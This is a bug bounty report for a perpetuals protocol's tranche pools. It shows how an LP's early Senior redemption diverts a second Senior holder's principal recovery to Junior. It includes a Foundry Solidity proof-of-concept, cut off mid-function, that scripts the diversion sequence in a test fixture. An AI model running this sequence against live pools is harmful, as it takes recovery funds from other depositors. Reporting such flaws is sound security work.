# \#99146 [SC-Low] Virtual-offset Senior redemption diverts a surviving LP's principal recovery to Junior after the MED-11 fix

**Submitted on Nov 12th 2026 at 04:50:41 UTC by @Rrudy for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99146
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Root cause

The MED-11 fix reduces Senior high-water mark (`H`) and principal (`P`) by the same *funded asset fraction* when a Senior redemption receives `A` assets: `P' = P - A` and `H' = H - floor(H*A/P)`. The Senior vault separately prices the payout with virtual ERC-4626 offsets: `floor(burnedShares*(P+1)/(preBurnSupply+1000))`. When `P` is tiny while `H` remains large after a loss, `A/P` can exceed the fraction of actual Senior shares burned. The HWM reduction then removes recovery priority attached to shares held by an unrelated Senior LP. [HWM writer](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L119-L131), [vault conversion](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1861-L1867).

The [accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L338) defines HWM as Senior entitlement to be restored by future Pool surplus before Junior receives that surplus. This PoC follows the redirected cash through funded LP redemptions: the unrelated Senior LP B receives less USDG and the attacker-controlled Senior plus Junior LP A receives more. The balances are actual token payouts, not a view-only NAV difference.

### Reproduction and realized harm

1. A initially funds 160,000 USDG of Senior shares and 200,000 USDG of Junior shares. Unrelated B funds 40,000 USDG of Senior shares. The common setup includes an authorized Owner `recapitalizePool(3,000,000 USDG)` **before** the loss-producing trades that wipe current Senior and Junior principal while preserving Senior HWM. The Owner is not controlled by A.
2. A transfers 12 USDG atoms to the Pool. The Owner subsequently uses the documented `accountExcess()` route, and a public LP epoch recognizes `P = freeAssets = 12 atoms`, `J = 0`, and `H = 200,006,481,502 atoms`. A cannot compel the Owner to admit that excess rather than sweep or ignore it.
3. From the same EVM snapshot, the control keeps A's Senior shares. The attack has A redeem its Senior shares first and receive 10 atoms. This is `10/12` of current principal although A burns about 80% of issued Senior shares. The pinned formula leaves `H' = 33,334,413,584 atoms`; scaling the pre-existing recovery target by the actual burned-share fraction would leave `40,002,097,915 atoms`. The difference, **6,667,684,331 atoms, is the aggregate surviving Senior HWM difference**, not a separate 6,667.68 USDG claim owned by B alone.
4. An unrelated, self-funded trader D then makes the same 40 loss-producing round trips in both branches. The Pool receives exactly `256,995,052,582 atoms` from those trades in each. At the same final timestamp, A and B submit their remaining LP shares for redemption and claim the funded USDG. B's final residual share quote is zero in both branches.

| Final USDG | Control: no early A exit | Attack: A exits first | Attack minus control |
| --- | ---: | ---: | ---: |
| B's actual wallet payout | 40,001.095896 | 33,333.578586 | **−6,667.517310** |
| A's Senior plus Junior wallets | 336,990.051956 | 343,655.657021 | **+6,665.605065** |
| Pool raw USDG | 2,797,432.696751 | 2,797,434.608996 | +1.912245 |

The three deltas sum to zero in USDG atoms. D's final wallet, credit and claim, Treasury credit, Keeper credit, and final time match between branches. B deposited 40,000 USDG. Its control payout includes 1.095896 USDG above that deposit, whereas the attack payout is **6,666.421414 USDG below its original contribution**. The 6,667.517310 USDG branch difference is primarily lost principal recovery, with the control's 1.095896 USDG excess kept distinct. B's immediate pre-recovery quote is only 2 atoms in both branches; the claimed diversion occurs **after D's real USDG payments enter the Pool**, when lowered Senior HWM routes that recovery cash to A's Junior position. We do not claim theft of the 2-atom quote, permanent freezing, or an end-to-end gas-adjusted profit figure.

### Why the selected impact is direct loss of principal recovery

The same later trading receipts enter the Pool in both branches. The earlier Senior exit changes who receives that real USDG: B's funded redemption falls by 6,667.517310 USDG while A's Junior-funded wallet rises. The separate zero-Senior-coupon control still leaves B **6,667.334631 USDG below its 40,000 USDG contribution** after A exits. The claim is diversion of cash that would restore B's earlier principal contribution, not theft of a Senior coupon or B's immediately redeemable 2-atom quote. B's pre-recovery principal is already impaired; the loss is realized when the subsequent recovery cash is allocated and paid.

An auxiliary **zero Senior coupon** control sets `seniorRateBps = 0` through the ordinary timelock in the test fixture. It is not the release-setting impact run. In that control, B receives `39,999.999999 USDG` without A's early exit and `33,332.665369 USDG` after it: a **6,667.334630 USDG** branch difference, and the latter is 6,667.334631 USDG below B's 40,000 USDG deposit. A's wallet increases by 6,665.422431 USDG and Pool raw USDG by 1.912199. This isolates principal recovery from the Senior coupon; it does not assert that all forms of yield or trading revenue disappear.

### Auxiliary check: public dust creation with observed feed values

An independently rerun second Foundry test reaches the impaired Senior principal through public order and LP settlement calls **without an `accountExcess()` call or any Owner call after the initial wipeout**. The common setup still includes an authorized 3,000,000 USDG Owner recapitalization *before* the wipeout; it is not an Owner-free end-to-end attack. After the synthetic wipeout, the test opens a 1,255-lot LONG using saved six-feed raw price/confidence values at tick 10, settles an LP epoch at tick 11, closes 284 lots at tick 17 and 971 lots at tick 19, then settles at tick 20 approximately seven weeks later. The resulting Senior principal is **647 USDG atoms**, with HWM `200,006,481,502` atoms. A burns `159,559,820,458,974` Senior shares and receives 518 atoms; the funded-asset HWM formula leaves `39,877,644,689` atoms, whereas scaling by the shares actually burned would leave `40,124,757,091` atoms.

The five relevant saved observations are listed below in feed order EUR, JPY, GBP, CAD, SEK, CHF. Their exponents are `[-5, -3, -5, -5, -5, -5]`; the mock uses `publishTime = originalTime - 79,228,800` and `prevPublishTime = publishTime - 1`.

| Tick | Original publishTime | Raw prices | Raw confidences |
| --- | ---: | --- | --- |
| 10 | 1789581699 | 115156, 155289, 134210, 139527, 979132, 81979 | 8, 13, 16, 6, 402, 8 |
| 11 | 1789583356 | 114997, 155521, 134108, 139693, 981625, 82210 | 2, 4, 3, 5, 78, 6 |
| 17 | 1789583436 | 114968, 155547, 134082, 139706, 981742, 82230 | 2, 4, 4, 2, 116, 3 |
| 19 | 1789583449 | 114964, 155570, 134068, 139724, 981866, 82240 | 4, 7, 4, 5, 69, 6 |
| 20 | 1793635973 | 111938, 157854, 134132, 139707, 979444, 82008 | 3, 6, 4, 4, 89, 3 |

From the same snapshot, B's final funded cash is `40,001.095896 USDG` if A stays and `39,754.745075 USDG` if A exits first (**−246.350821 USDG**). The attacker coalition's actual wallets, including its trader, gain **244.359352 USDG** relative to the control, and Pool raw cash rises **1.991469 USDG**; these three differences sum to zero in atoms. D's wallet and Treasury/Keeper credits match. The independent offline replay passed 1/1 with the pinned `src` files unchanged. This is a separate, smaller impact check, not the 6,667.517310 USDG main-test result.

A further matched-epoch control also passed 1/1: both branches submit the same Junior refund request and settle the **same tick-20 LP epoch** with the same price, while only the attack branch adds A's Senior exit. Its final B, attacker-coalition, Pool, D, Treasury and Keeper amounts are atom-for-atom identical to the figures above. The original control's mark-only call therefore did not cause this measured difference.

These auxiliary checks support reachability and control alignment; their full test sources are not embedded below. Appendices A–C are the self-contained reproduction of the **primary 6,667.517310 USDG** payout difference.

The test re-encodes saved observations into **unsigned `MockPyth` updates** and shifts their timestamps by 131 weeks while retaining order and intervals. The first tick predates the recorded v2.0.0 deployment; the wipeout and subsequent recovery trades still use synthetic prices. This check removes post-wipeout `accountExcess()` and atom-level price tuning for the dust step, but it is not a complete signed, deployed-market attack sequence.

### Published MED-11 boundary

[Cecuro MED-11](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf) identified an earlier mismatch between burned-share HWM scaling and net principal debits, including loss of retained-fee protection. [PR #123](https://github.com/Plether-Fi/plether-core/pull/123) replaced the writer with the funded-asset fraction `A/P` to preserve the aggregate `H/P` ratio. That formula is public. We do not claim it is evaluated incorrectly, and we do not claim PR #123's less-than-one-atom rounding bound is broken, because that bound concerns integer rounding *within* `H*A/P`.

PR #123 expressly chose net-funded-asset scaling for impaired redemptions and discussed virtual offsets. It did not show the following multi-holder cash-flow consequence at the pinned commit:
- The vault's `+1` virtual asset lets the paid fraction exceed the burned-share fraction, which strips recovery entitlement from shares that were never redeemed.
- The published remediation does not present a surviving Senior holder's funded payout after a second holder exits at a near-zero principal quote. This PoC compares that payout with the same-snapshot no-exit control.
- Neither the program's known-issues list nor the Known Limitations section of `SECURITY.md` covers it.

**Security property implicated by the payout.**
- **Senior-first recovery for a surviving holder.** `SECURITY.md` lists "High-water-mark protection | Senior impairment must be restored before junior extracts surplus" among its Critical Protocol Invariants ([`SECURITY.md:394`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L394)). The aggregate HWM formula executes as written, but A's 10-atom exit removes more HWM than the fraction of Senior shares burned. Subsequent revenue reaches Junior (A) while B receives only 33,333.578586 USDG against its original 40,000 USDG contribution. The claimed violation is the loss of B's surviving recovery entitlement, not an arithmetic failure in the aggregate formula.
- **Virtual-offset boundary.** `SECURITY.md:1082-1083` says healthy withdrawals must not create impairment through virtual-offset pricing and that conservative rounding can preserve an existing impairment ([L1082-L1083](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1082-L1083)). It does not explicitly guarantee a per-holder outcome for an already impaired tranche. This PoC tests that narrower, multi-holder case; its measured payout difference is the evidence for the proposed incomplete-fix impact.
- **Intended properties stated in the tests.**
  - "Senior recovery rights should survive wipeout" ([`TrancheRecoveryBehavior.t.sol:76`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L65-L77)).
  - "All remaining Senior principal must recover first" ([`SeniorWithdrawalProtection.t.sol:51`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/SeniorWithdrawalProtection.t.sol#L45-L53)).
- **Not covered by the MED-11 tests named in PR #123.** None has a second Senior holder who stays in an impaired tranche and is paid after recovery:
  - `SeniorWithdrawalProtectionTest` has a single Senior holder.
  - `SeniorWithdrawalMathTest` fuzzes `scaleSeniorOnWithdraw` with `assets` as a free input rather than the vault quote.
  - `SeniorRedemptionHighWaterTest` ([L162-L198](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/SeniorCouponCheckpoints.t.sol#L162-L198)) uses two holders in a healthy tranche and never pays Bob.

MED-11's remediation describes aligning the surviving Senior entitlement with the surviving ownership, offering the funded-asset fraction or a rule that mirrors the vault's virtual-share pricing as possible ways to do so (PDF pp. 31–32). This test checks the first option in the impaired multi-holder state: a 10-atom funded exit burns about 80% of shares but removes about 83.33% of HWM, and the discrepancy reaches B's funded payout. The issue is the economic result of the selected fix at this boundary, not an arithmetic error in evaluating `A/P`.

The reported issue is the **incomplete or fix-induced outcome at the pinned commit**. In the deeply impaired, multi-holder state, the repaired `A/P` fraction is larger than the redeemed ownership fraction. The original share-fraction writer would leave a higher HWM on this particular snapshot, while the pinned writer transfers later funded recovery away from B. The original formula is not proposed as a general repair. The measured second-holder payout is the result that matters. The [competition's known-issue rule](https://immunefi.com/audit-competition/plether/scope/) permits a report on a fixed/acknowledged root where the pinned fix is incomplete or creates a new bug. This PoC demonstrates that incomplete multi-holder recovery result.

### Preconditions, feasibility, and cost boundary

- A must already own substantial Senior and Junior shares. The primary 6,667.517310 USDG example requires an Owner recapitalization before the severe loss and `accountExcess()` afterward. The auxiliary 246.350821 USDG example removes the latter call, but still requires the earlier recapitalization. `recapitalizePool()` has no on-chain deficit/degraded precondition, but the documentation calls it a recovery action. The attacker cannot force that Owner contribution, and this test does not establish how often an Owner would pre-fund a healthy Pool. No malicious Owner action is assumed. The [competition scope](https://immunefi.com/audit-competition/plether/scope/) includes bugs triggered by legitimate documented trusted-role actions.
- The main test uses the release's six feed IDs, weights, base prices, inversions, seed amounts and risk settings. It supplies synthetic unsigned `MockPyth` updates with `expo = -8` and `conf = 0` for all six feeds; those uniform mock exponents are **not** a replay of the varying exponents in signed market payloads. Mocking the out-of-scope Pyth input is allowed by the [PoC rules](https://immunefi.com/audit-competition/plether/scope/), but a signed six-feed market time series reaching this exact state has not been demonstrated. That includes a sequence made only of post-deployment observations. The rules state that impact is calculated first, separately from feasibility.
- The initial loss setup alternates a roughly 2.18% basket range across 48 order executions, and D's later cash generation uses 40 round trips across 80 executions. The test compresses those synthetic price changes into short simulated intervals. This establishes the pinned contracts' state transition and the same-snapshot cash impact; it does not establish that this exact price sequence occurs at that frequency in the real FX market. An organically reached impaired/recovery state would expose the same accounting boundary.
- At the final dust step A contributes 12 USDG atoms and receives 10 atoms in its Senior redemption. Foundry measured 963,025 gas for the redemption helper, including its keeper settlement call. These are **marginal step measurements**, not the total attack cost or Arbitrum fee. A's initial LP capital, prior loss exposure, oracle data, other transactions, and the Owner's 3,000,000 USDG recapitalization are separate prerequisites. The report does not treat the Owner's money as an attacker expense.

### Suggested fix

Preserve the recovery entitlement attached to surviving Senior shares when virtual-offset pricing makes the paid-asset fraction differ from the burned-share fraction. Keep the actual cash debit to principal, and test any revised HWM rule against healthy and impaired multi-holder exits, frozen fees, partial funding, terminal dust, and later independent revenue paid to the surviving holder. This is a design direction, not an audited patch.

## Proof of Concept

Save Appendices A, B and C below as `OneAtomP12DonorFollowup.t.sol`, `patch_sixfeed_fixture.py` and `run_repro.sh` in one directory. Against a checkout of the pinned commit with an offline Foundry toolchain and Solidity 0.8.35 binary, run on Linux or WSL:

```bash
bash run_repro.sh /absolute/path/to/pinned-source /absolute/path/to/offline-toolchain /absolute/path/to/solc-0.8.35 /absolute/path/to/new-output
```

The runner checks the pinned `HousePool.sol` hash, copies the checkout to disposable scratch space, adds the PoC, changes the copied **test fixture** to install the six-feed MockPyth configuration and production Router, and removes other test files **only inside that scratch copy** to keep compilation bounded. It runs `forge --offline` inside `bwrap --unshare-net` and does not modify `packages/perps/src`. Appendix A/B/C SHA-256 values are `46ccc862854a5e47461ea8f3f40eeaae61c8c956d0cb803ab76424dfe42bc64d`, `eb3f4e8607b914ab435f2881d4108a0909153827d6c443a20074380298725726`, and `0ca1ea21cb69570e0a238963faad97e299cafce79557fd0ca2fd1ef1c9745e0a`. The final isolated `final-20261112/repro02` run exited 0 with empty stderr and Foundry 1/1 PASS. The Solidity test asserts A's 10-atom early payout, equal D outcomes and final time, the three exact payout/cash deltas in the table, and their atom-level conservation. The saved logs also show Pool/Treasury/Keeper balances.

**Optional economic control:** Add `import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";` at file scope in Appendix A. Then, inside `setUp`, replace `_setSeniorCapacity(40_000_000e6, 8000);` with the block below. This is the auxiliary zero-coupon branch quoted above, not the release-setting run and not required for the primary reproduction.

```solidity
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        poolConfig.seniorRateBps = 0;
        pool.proposePoolConfig(poolConfig);
        uint256 activation = pool.poolConfigActivationTime();
        vm.warp(activation - 1);
        _mark(1e8);
        pool.finalizePoolConfig();
        assertEq(pool.seniorRateBps(), 0, "zero coupon");
```


## Appendix A — full Solidity PoC, `OneAtomP12DonorFollowup.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

contract OneAtomP12ScaledTest is BasePerpTest {
    uint256 constant SCALE = 100;
    address constant SENIOR_LP = address(0xB0B);
    address constant SECOND_SENIOR = address(0xB0C);
    address constant JUNIOR_LP = address(0xA11CE);
    address constant TRADER = address(0xC0A01);
    address constant DONOR = address(0xD0A0);
    address constant KEEPER = address(0xB0A7D);
    // These synthetic values sit within the extrema of saved signed six-feed observations.
    uint256 constant HIGH = 98_598_508;
    uint256 constant LOW = 96_497_594;
    uint256 constant P = 30_000e6 * SCALE;

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function setUp() public override {
        super.setUp();
        CfdTypes.RiskParams memory risk = _riskParams();
        risk.vpiFactor = 0.01e18;
        risk.maintMarginBps = 10;
        risk.initMarginBps = 20;
        _setRiskParams(risk);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1_000e6;
        config.maxPendingOrders = 5;
        routerAdmin.proposeRouterConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        _setSeniorCapacity(40_000_000e6, 8000);
    }

    function _order(CfdTypes.Side side, bool close, uint256 size, uint256 margin, uint256 target, uint256 tag)
        private view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = bytes32(tag);
        r.side = side;
        r.isClose = close;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = target;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60), executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _execute(CfdTypes.Side side, bool close, uint256 size, uint256 margin, uint256 price, uint256 tag) private {
        uint256 target = side == CfdTypes.Side.LONG ? (close ? engine.CAP_PRICE() : 1) : (close ? 1 : engine.CAP_PRICE());
        OrderV3Types.OrderRequest memory r = _order(side, close, size, margin, target, tag);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(r);
        bytes[] memory tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, tick);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "ordinary public order");
    }

    function _executeFor(address account, CfdTypes.Side side, bool close, uint256 size, uint256 margin, uint256 price, uint256 tag) private {
        uint256 target = side == CfdTypes.Side.LONG ? (close ? engine.CAP_PRICE() : 1) : (close ? 1 : engine.CAP_PRICE());
        OrderV3Types.OrderRequest memory r = _order(side, close, size, margin, target, tag);
        vm.prank(account);
        uint64 id = router.commitOrder(r);
        bytes[] memory tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, tick);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "independent donor public order");
    }

    function _mark(uint256 price) private returns (bytes[] memory tick) {
        tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(tick);
    }

    function _log(string memory label) private {
        emit log_string(label);
        emit log_named_uint("cash", pool.totalAssets());
        emit log_named_uint("unassigned", pool.unassignedAssets());
        emit log_named_uint("free", pool.getFreeAssets());
        emit log_named_uint("Senior P", pool.seniorPrincipal());
        emit log_named_uint("Junior J", pool.juniorPrincipal());
        emit log_named_uint("Senior HWM", pool.seniorHighWaterMark());
        emit log_named_uint("pending revenue", pool.pendingTradingRevenueAssets());
        emit log_named_uint("Trader claim", engine.traderClaimBalanceAssets(TRADER));
    }

    function _requestJuniorRefundRound(uint256 previousId) private returns (uint256 id) {
        uint256 shares = juniorVault.refundableRedeemRequest(previousId, JUNIOR_LP);
        assertGt(shares, 0, "zero-quote Junior epoch returns shares");
        vm.prank(JUNIOR_LP);
        assertEq(juniorVault.claimRedeemRefund(previousId, JUNIOR_LP, JUNIOR_LP), shares, "Junior refund");
        vm.warp(vm.getBlockTimestamp() + 3601);
        _mark(HIGH);
        vm.prank(JUNIOR_LP);
        id = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
        if (vm.getBlockTimestamp() < pool.lpEpochStart(id)) vm.warp(pool.lpEpochStart(id));
    }

    function test_P12Scaled() public { _run(0); }

    function _run(int256 shareDelta) private {
        settlementToken.mint(JUNIOR_LP, 2_000e6 * SCALE);
        vm.startPrank(JUNIOR_LP);
        settlementToken.approve(address(juniorVault), 2_000e6 * SCALE);
        uint256 jid = juniorVault.requestDeposit(2_000e6 * SCALE, JUNIOR_LP);
        vm.stopPrank();
        if (vm.getBlockTimestamp() < pool.lpEpochStart(jid)) vm.warp(pool.lpEpochStart(jid));
        bytes[] memory tick = _mark(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        vm.prank(JUNIOR_LP);
        juniorVault.claimDeposit(jid, 2_000e6 * SCALE, JUNIOR_LP, JUNIOR_LP);

        // With 1 USDG permanent seeds, Senior capacity opens only after Junior activation.
        settlementToken.mint(SENIOR_LP, 1_600e6 * SCALE);
        vm.startPrank(SENIOR_LP);
        settlementToken.approve(address(seniorVault), 1_600e6 * SCALE);
        uint256 sid = seniorVault.requestDeposit(1_600e6 * SCALE, SENIOR_LP);
        vm.stopPrank();
        settlementToken.mint(SECOND_SENIOR, 400e6 * SCALE);
        vm.startPrank(SECOND_SENIOR);
        settlementToken.approve(address(seniorVault), 400e6 * SCALE);
        uint256 bid = seniorVault.requestDeposit(400e6 * SCALE, SECOND_SENIOR);
        vm.stopPrank();
        assertEq(bid, sid, "independent B funds same Senior epoch");
        if (vm.getBlockTimestamp() < pool.lpEpochStart(sid)) vm.warp(pool.lpEpochStart(sid));
        tick = _mark(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        vm.prank(SENIOR_LP);
        seniorVault.claimDeposit(sid, 1_600e6 * SCALE, SENIOR_LP, SENIOR_LP);
        vm.prank(SECOND_SENIOR);
        seniorVault.claimDeposit(bid, 400e6 * SCALE, SECOND_SENIOR, SECOND_SENIOR);
        assertGt(seniorVault.balanceOf(SECOND_SENIOR), 0, "B buys Senior shares with own USDG");
        emit log_named_uint("B_SELF_FUNDED_SHARES", seniorVault.balanceOf(SECOND_SENIOR));
        emit log_named_uint("A_START_SENIOR_SHARES", seniorVault.balanceOf(SENIOR_LP));
        emit log_named_uint("OWNER_START_JUNIOR_SHARES", juniorVault.balanceOf(address(this)));
        emit log_named_uint("OWNER_START_SENIOR_SHARES", seniorVault.balanceOf(address(this)));
        vm.warp(vm.getBlockTimestamp() + 3601);

        // The common seed adds 3,000,000 USDG of owner recapitalization before the wipeout.
        settlementToken.mint(address(this), P);
        settlementToken.approve(address(engine), P);
        engine.recapitalizePool(P);
        uint256 juniorShares = juniorVault.balanceOf(JUNIOR_LP);
        uint256 firstRedeemShares = juniorShares * 3 / 5;
        if (shareDelta < 0) firstRedeemShares -= uint256(-shareDelta);
        else firstRedeemShares += uint256(shareDelta);
        emit log_named_uint("FIRST_REDEEM_REQUEST_SHARES", firstRedeemShares);
        vm.prank(JUNIOR_LP);
        uint256 firstId = juniorVault.requestRedeem(firstRedeemShares, JUNIOR_LP, JUNIOR_LP);
        if (vm.getBlockTimestamp() < pool.lpEpochStart(firstId)) vm.warp(pool.lpEpochStart(firstId));
        tick = _mark(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        uint256 firstClaimable = juniorVault.claimableRedeemRequest(firstId, JUNIOR_LP);
        uint256 firstPaid;
        if (firstClaimable > 0) {
            vm.prank(JUNIOR_LP);
            firstPaid = juniorVault.claimRedeem(firstId, firstClaimable, JUNIOR_LP, JUNIOR_LP);
        }
        emit log_named_uint("FIRST_REDEEM_PAID", firstPaid);
        emit log_named_uint("A_JUNIOR_SHARES_AFTER_EARLY_REDEEM", juniorVault.balanceOf(JUNIOR_LP));
        emit log_named_uint("A_JUNIOR_SHARE_BPS", juniorVault.balanceOf(JUNIOR_LP) * 10_000 / juniorVault.totalSupply());
        emit log_named_uint("A_SENIOR_SHARE_BPS", seniorVault.balanceOf(SENIOR_LP) * 10_000 / seniorVault.totalSupply());

        _fundTrader(TRADER, 5_000e6 * SCALE);
        _mark(HIGH);
        for (uint256 i; i < 12; ++i) {
            uint256 size = (pool.totalAssets() / 1e6 * 32 / 100 / 100) * 100e18;
            _execute(CfdTypes.Side.LONG, false, size, 500e6 * SCALE, HIGH, 1 + 4*i);
            _execute(CfdTypes.Side.LONG, true, size, 0, LOW, 2 + 4*i);
            _execute(CfdTypes.Side.SHORT, false, size, 500e6 * SCALE, LOW, 3 + 4*i);
            _execute(CfdTypes.Side.SHORT, true, size, 0, HIGH, 4 + 4*i);
        }
        uint256 remainingJuniorShares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 lossId = juniorVault.requestRedeem(remainingJuniorShares, JUNIOR_LP, JUNIOR_LP);
        if (vm.getBlockTimestamp() < pool.lpEpochStart(lossId)) vm.warp(pool.lpEpochStart(lossId));
        tick = _mark(HIGH);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        _log("PUBLIC_LOSS_SEED");
        assertEq(pool.seniorPrincipal(), 0, "Senior wiped");
        assertEq(pool.juniorPrincipal(), 0, "Junior wiped");
        uint256 baselineCash = pool.totalAssets();
        uint256 hwmBefore = pool.seniorHighWaterMark();
        assertEq(pool.unassignedAssets(), baselineCash, "all cash unassigned");
        assertGt(hwmBefore, 1, "Senior HWM survives");
        assertEq(pool.getFreeAssets(), 0, "zero free cash seed");

        // The attacker can transfer twelve token atoms without selecting an oracle tick.
        // Owner's ordinary accountExcess call later admits that unsolicited cash.
        settlementToken.mint(SENIOR_LP, 12);
        vm.prank(SENIOR_LP);
        settlementToken.transfer(address(pool), 12);
        assertEq(pool.excessAssets(), 12, "attacker-funded excess exists");
        vm.prank(address(this));
        pool.accountExcess();
        assertEq(pool.excessAssets(), 0, "owner recognizes exact excess");
        assertEq(pool.totalAssets(), baselineCash + 12, "recognized cash increases by twelve atoms");
        (uint256 projectedP,,,) = pool.getPendingTrancheState();
        emit log_named_uint("PROJECTED_P_AFTER_ACCOUNT_EXCESS", projectedP);
        uint256 commitId = _requestJuniorRefundRound(lossId);
        tick = _mark(HIGH);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        _log("STORED_PUBLIC_ACCOUNT_EXCESS_DUST");
        assertGt(juniorVault.refundableRedeemRequest(commitId, JUNIOR_LP), 0, "public refund advanced epoch");
        assertEq(pool.seniorPrincipal(), 12, "stored Senior principal twelve atoms");
        assertEq(pool.juniorPrincipal(), 0, "Junior remains wiped");
        assertEq(pool.seniorHighWaterMark(), hwmBefore, "HWM survives loss reconcile");
        assertEq(pool.getFreeAssets(), 12, "twelve atoms truly withdrawable");
        assertEq(pool.unassignedAssets(), baselineCash, "unassigned intact");
        uint256 finalJuniorRefund = juniorVault.refundableRedeemRequest(commitId, JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        assertEq(juniorVault.claimRedeemRefund(commitId, JUNIOR_LP, JUNIOR_LP), finalJuniorRefund, "attacker Junior shares returned");
        assertGt(juniorVault.balanceOf(JUNIOR_LP), 0, "attacker Junior shares remain");

        _compareBranches();
    }

    struct Outcome {
        uint256 aEarlyPaid;
        uint256 aLaterPaid;
        uint256 aJuniorPaid;
        uint256 bPaid;
        uint256 bQuoteBefore;
        uint256 bQuoteFinal;
        uint256 aQuoteFinal;
        uint256 aWalletFinal;
        uint256 bWalletFinal;
        uint256 donorRevenue;
        uint256 donorWalletFinal;
        uint256 donorCreditFinal;
        uint256 donorClaimFinal;
        uint256 projectedSenior;
        uint256 projectedJunior;
        uint256 hwmAfterA;
        uint256 poolRawFinal;
        uint256 ownerQuoteFinal;
        uint256 treasuryCreditFinal;
        uint256 keeperCreditFinal;
        uint256 finalTime;
    }

    function _compareBranches() private {
        uint256 supply = seniorVault.totalSupply();
        uint256 aShares = seniorVault.balanceOf(SENIOR_LP);
        uint256 bShares = seniorVault.balanceOf(SECOND_SENIOR);
        emit log_named_uint("P12_SENIOR_SUPPLY", supply);
        emit log_named_uint("P12_A_SHARES", aShares);
        emit log_named_uint("P12_B_SHARES", bShares);
        assertEq(seniorVault.estimateRedeemAssets(aShares), 10, "A positive 10-atom quote");
        assertEq(seniorVault.estimateRedeemAssets(bShares), 2, "B positive 2-atom quote");
        assertEq(pool.seniorPrincipal(), 12, "common P12");
        assertEq(pool.juniorPrincipal(), 0, "common J0");
        assertEq(clearinghouse.balanceAssets(DONOR), 0, "D independent credit");
        assertEq(settlementToken.balanceOf(DONOR), 0, "D independent wallet");
        uint256 common = vm.snapshotState();
        Outcome memory control = _branch(false);
        assertTrue(vm.revertToState(common), "same P12 snapshot");
        Outcome memory attack = _branch(true);
        emit log_named_uint("CONTROL_A_EARLY_PAID", control.aEarlyPaid);
        emit log_named_uint("ATTACK_A_EARLY_PAID", attack.aEarlyPaid);
        emit log_named_uint("CONTROL_D_REVENUE", control.donorRevenue);
        emit log_named_uint("ATTACK_D_REVENUE", attack.donorRevenue);
